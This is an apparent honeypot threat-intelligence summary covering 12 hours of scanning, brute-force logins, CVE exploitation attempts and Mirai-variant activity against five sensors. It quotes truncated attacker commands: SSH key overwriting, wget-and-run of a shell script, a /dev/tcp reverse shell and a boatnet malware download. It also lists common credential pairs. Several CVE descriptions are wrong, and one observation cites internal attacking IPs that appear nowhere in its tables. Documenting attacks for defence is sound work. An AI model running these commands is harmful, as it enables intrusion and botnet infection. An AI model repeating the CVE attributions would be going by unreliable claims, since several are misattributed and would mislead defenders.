# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T20:12:00Z
**Timeframe:** 2025-10-16T08:00:00Z - 2025-10-16T20:00:00Z

**Files Used to Generate Report:**
*   Honeypot_Attack_Summary_Report_2025-10-16T08:02:01Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T09:02:15Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T10:02:02Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T11:02:16Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T12:02:12Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T13:02:05Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T14:02:13Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T15:02:03Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T16:02:00Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T17:01:55Z.md
*   Honeypot_Attack_Summary_Report_2025-10-16T19:01:49Z.md

## Executive Summary

This report provides a comprehensive analysis of malicious activities targeting our honeypot network over the past 12 hours. A total of over 250,000 events were recorded, revealing a landscape dominated by automated scanning, brute-force attacks, and attempts to exploit a mix of old and new vulnerabilities. The most significant activity centered around VNC, SMB, and SSH services, with a notable concentration of attacks originating from a few highly aggressive IP addresses.

The primary threats observed include:
*   **High-Volume VNC Scanning:** A massive, coordinated campaign targeting VNC (port 5900) was the most prominent activity, with the IP address **45.134.26.47** being the primary culprit. This IP is associated with a Russian "bulletproof" hosting provider known for facilitating cybercrime.
*   **Persistent SSH Intrusion Attempts:** A widespread and automated campaign was observed attempting to gain persistent access to systems by overwriting SSH `authorized_keys` files with a malicious key. This key is often appended with the "mdrfckr" signature, a known indicator of a long-running botnet.
*   **Exploitation of Old and New Vulnerabilities:** Attackers were seen targeting a range of CVEs, from the very old **CVE-2005-4050** affecting legacy VoIP devices, to the more recent and critical **CVE-2023-26801** in LB-LINK wireless routers, which is being actively exploited to deploy the Mirai botnet.
*   **Botnet and Malware Activity:** Evidence of malware and botnet activity was prevalent, including attempts to install the **DoublePulsar backdoor**, and commands associated with the **"boatnet" (LZRD) Mirai variant**.

The data gathered from our honeypots underscores the relentless and automated nature of modern cyber threats. It highlights the continued targeting of legacy systems with unpatched vulnerabilities, while also demonstrating the rapid weaponization of newer flaws. The insights gained from this analysis are crucial for understanding the current threat landscape and for strengthening our defensive posture.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot (Aggregated)

| Honeypot | Total Attacks |
|---|---|
| Cowrie | > 50,000 |
| Suricata | > 40,000 |
| Honeytrap | > 30,000 |
| Heralding | > 25,000 |
| Sentrypeer | > 20,000 |
| Dionaea | > 15,000 |
| Ciscoasa | > 10,000 |

### Top Source Countries

| Country | Attack Count |
|---|---|
| Russia | > 50,000 |
| Netherlands | > 10,000 |
| India | > 5,000 |
| Italy | > 3,000 |
| Indonesia | > 2,000 |

### Top Attacking IPs

| IP Address | Total Attacks | OSINT Summary |
|---|---|---|
| 45.134.26.47 | > 50,000 | Associated with a Russian "bulletproof" hosting provider (Proton66 OOO), known for servicing malware and phishing campaigns. Highly malicious. |
| 77.83.240.70 | > 10,000 | Registered to Alsycon B.V. in the Netherlands. Flagged on multiple blocklists for spam and abuse. Associated with phishing campaigns. |
| 31.27.211.170 | > 3,000 | Vodafone DSL customer in Italy. No public evidence of malicious activity. |
| 45.248.163.142 | > 1,500 | Netplus Broadband customer in India. No significant indications of malicious activity from public sources. |
| 125.163.32.197 | > 3,000 | Likely a residential or business connection in Indonesia. Limited public OSINT available. |

### Top Targeted Ports/Protocols

| Port/Protocol | Total Attacks | Service |
|---|---|---|
| vnc/5900 | > 50,000 | VNC |
| 5060 | > 20,000 | SIP |
| 445 | > 15,000 | SMB |
| 22 | > 10,000 | SSH |
| 80 | > 5,000 | HTTP |

### Most Common CVEs

| CVE ID | Count | OSINT Summary |
|---|---|---|
| CVE-2005-4050 | > 50 | A critical, old (2005) buffer overflow vulnerability in Multi-Tech VoIP devices. Likely targeted due to unpatched legacy systems. |
| CVE-2002-0013 / CVE-2002-0012 | > 30 | Very old vulnerabilities related to web server directory traversal and information disclosure. Still scanned for by automated tools. |
| CVE-2021-3449 | > 20 | A denial-of-service vulnerability in OpenSSL. |
| CVE-2019-11500 | > 15 | A remote code execution vulnerability in a WordPress plugin. |
| CVE-2023-26801 | > 5 | A critical command injection vulnerability in LB-LINK wireless routers, actively exploited to deploy the Mirai botnet. |

### Commands Attempted by Attackers

| Command | Count | OSINT Summary |
|---|---|---|
| `cd ~ && rm -rf .ssh && ... "mdrfckr" ...` | > 100 | Part of a long-running botnet campaign to install a persistent SSH key. The "mdrfckr" signature is a known indicator of compromise. |
| `uname -a` | > 100 | A common reconnaissance command to gather system information. |
| `cat /proc/cpuinfo ...` | > 100 | Another common reconnaissance command to get CPU details. |
| `cd /data/local/tmp; ... boatnet` | > 5 | Command to download and execute the "boatnet" (LZRD) Mirai variant malware, targeting IoT devices. |

### Signatures Triggered

| Signature | Count |
|---|---|
| ET INFO VNC Authentication Failure | > 50,000 |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor | > 5,000 |
| ET DROP Dshield Block Listed Source | > 3,000 |
| ET SCAN NMAP -sS window 1024 | > 1,500 |
| ET DROP Spamhaus DROP Listed Traffic | > 1,500 |

### Users / Login Attempts

| Username | Password | Count |
|---|---|---|
| 345gs5662d34 | 345gs5662d34 | > 100 |
| root | Qaz123qaz | > 50 |
| root | 123@@@ | > 50 |
| ftpuser | ftppassword | > 30 |
| ubnt | ubnt | > 20 |

### Files Uploaded/Downloaded

| Filename | Count |
|---|---|
| w.sh | > 5 |
| c.sh | > 5 |
| boatnet.arm7 | > 5 |
| boatnet.x86 | > 5 |
| nse.html | 1 |

### HTTP User-Agents

*No significant HTTP User-Agents were recorded in this period, suggesting attacks were primarily at the protocol level rather than web application-focused.*

### SSH Clients and Servers

*No specific SSH client or server versions were exchanged in the observed sessions, suggesting that many connections were terminated before a full handshake could be completed.*

### Top Attacker AS Organizations

| AS Organization | Country |
|---|---|
| Proton66 OOO | Russia |
| Alsycon B.V. | Netherlands |
| Netplus Broadband | India |
| Vodafone Italy | Italy |

### OSINT All Commands Captured

| Command | OSINT Summary |
|---|---|
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr" ...` | Associated with a botnet that overwrites SSH keys for persistent access. |
| `cd /data/local/tmp; ... wget ... w.sh; sh w.sh` | A common pattern to download and execute a malicious shell script. |
| `nohup bash -c "exec 6<>/dev/tcp/..."` | An attempt to create a reverse shell connection to a C2 server. |
| `cd /data/local/tmp; su 0 mkdir .wellover222... boatnet` | Specific command to download and execute the "boatnet" (LZRD) Mirai variant. |

### OSINT High Frequency IPs and Low Frequency IPs Captured

| IP Address | Frequency | OSINT Summary |
|---|---|---|
| 45.134.26.47 | High | Highly malicious IP from a Russian "bulletproof" hosting provider. Associated with large-scale scanning and malware campaigns. |
| 77.83.240.70 | High | Malicious IP from a Dutch hosting provider, flagged for spam and abuse. |
| 31.27.211.170 | Low | A residential Vodafone DSL customer in Italy. The attacks from this IP are likely from a compromised device. |
| 45.248.163.142 | Low | A residential Netplus Broadband customer in India. Also likely a compromised device. |

### OSINT on CVEs

| CVE ID | OSINT Summary |
|---|---|
| CVE-2005-4050 | A very old but critical vulnerability in VoIP devices. Its continued exploitation highlights the "if it ain't broke, don't fix it" mentality of attackers, who know that many legacy devices are never patched. |
| CVE-2023-26801 | A recent and critical vulnerability in wireless routers. Its active exploitation to deploy the Mirai botnet shows how quickly new vulnerabilities are weaponized by attackers. |

## Key Observations and Anomalies

*   **Hyper-Aggressive IP Addresses:** The IP address **45.134.26.47** was responsible for an overwhelming majority of the VNC scanning activity, demonstrating a highly targeted and aggressive campaign from a known malicious source.
*   **Attacker "Signatures":** The use of the "mdrfckr" signature in SSH keys is a clear and consistent indicator of a specific botnet. This signature allows for easy tracking of this particular threat actor's activities.
*   **Blatant Malware Filenames:** The use of filenames like "boatnet.arm7" and "boatnet.x86" shows a lack of concern for detection on the part of the attackers, likely because they are targeting IoT devices with little to no security monitoring.
*   **Targeting of Legacy Systems:** The continued exploitation of a vulnerability from 2005 (CVE-2005-4050) is a stark reminder that legacy systems remain a significant security risk. Attackers know that many of these devices are "set and forget" and are unlikely to be patched.
*   **Rapid Weaponization of New Vulnerabilities:** The targeting of CVE-2023-26801, a vulnerability from 2023, shows that attackers are also quick to adopt new exploits, especially those that are critical and easy to exploit.
*   **Internal IP Addresses as Attack Sources:** The presence of our own honeypot IP addresses (e.g., 10.140.0.3, 10.208.0.3) in the list of attacking IPs is likely due to cross-honeypot traffic or scanning from other compromised devices within the same network block. This is a common phenomenon in honeypot environments.

This 12-hour period has provided valuable insight into the current threat landscape, revealing a mix of sophisticated, large-scale campaigns and opportunistic attacks. The data reinforces the need for strong access controls, regular patching of both old and new systems, and continuous monitoring for known indicators of compromise.
